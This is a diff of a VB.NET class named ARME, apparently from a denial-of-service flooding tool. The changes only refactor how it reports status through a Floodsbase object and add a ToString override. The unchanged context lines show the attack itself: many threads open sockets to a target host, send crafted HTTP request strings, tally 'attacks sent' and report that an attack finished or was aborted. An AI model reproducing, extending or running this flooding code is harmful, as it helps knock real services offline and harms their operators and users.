@@ -14,9 +14,7 @@ Public Class ARME
     Private AttackRunning As Boolean = False
     Private Attacks As Integer = 0
     Private RandomFile As Boolean
-    Private _Floodsbase As Floodsbase
-    Public Sub New(ByVal model As ArmeModel, ByVal Floodsbase As Floodsbase)
-        _Floodsbase = Floodsbase
+    Public Sub New(model As ArmeModel)
         If Not AttackRunning = True Then
             AttackRunning = True
             HostToAttack = model.newBaseFloodModel.Host
@@ -31,7 +29,7 @@ Public Class ARME
 
 
             Threads = New Thread(ThreadstoUse - 1) {}
-            _Floodsbase.SetMessage("A.R.M.E attack")
+            GetFloodsBase().SetMessage("A.R.M.E attack")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -39,7 +37,7 @@ Public Class ARME
             Next
 
         Else
-            _Floodsbase.SetMessage("An ARME Attack is Already Running on " & HostToAttack)
+            GetFloodsBase().SetMessage("An ARME Attack is Already Running on " & HostToAttack)
         End If
 
     End Sub
@@ -47,7 +45,7 @@ Public Class ARME
 
         ThreadsEnded = ThreadsEnded + 1
         If ThreadsEnded <= ThreadstoUse Then
-            _Floodsbase.SetMessage("ARME Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
+            GetFloodsBase().SetMessage("ARME Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
             ThreadsEnded = 0
             ThreadstoUse = 0
@@ -66,11 +64,11 @@ Public Class ARME
             Next
             AttackRunning = False
 
-            _Floodsbase.SetMessage("ARME Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
+            GetFloodsBase().SetMessage("ARME Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
             Attacks = 0
 
         Else
-            _Floodsbase.SetMessage("ARME Attack:, Not Running!")
+            GetFloodsBase().SetMessage("ARME Attack:, Not Running!")
         End If
     End Sub
     Private Function headers()
@@ -120,7 +118,7 @@ Public Class ARME
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString))
 
                         Attacks = Attacks + 1
-                        _Floodsbase.Set_AttackUpStrengOnByte(Attacks * HttpString.Length)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(Attacks * HttpString.Length)
 
                     Next i
                     Dim j As Integer
@@ -134,7 +132,7 @@ Public Class ARME
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        _Floodsbase.Set_AttackDownStrengOnByte(Attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(Attacks * sb.ToString().Length)
                         socketArray(j).Close()
                     Next j
                     Continue Do
@@ -147,4 +145,7 @@ Public Class ARME
         End Try
         Ended()
     End Sub
+    Public Function ToString()
+        Return MyBase.ToString()
+    End Function
 End Class
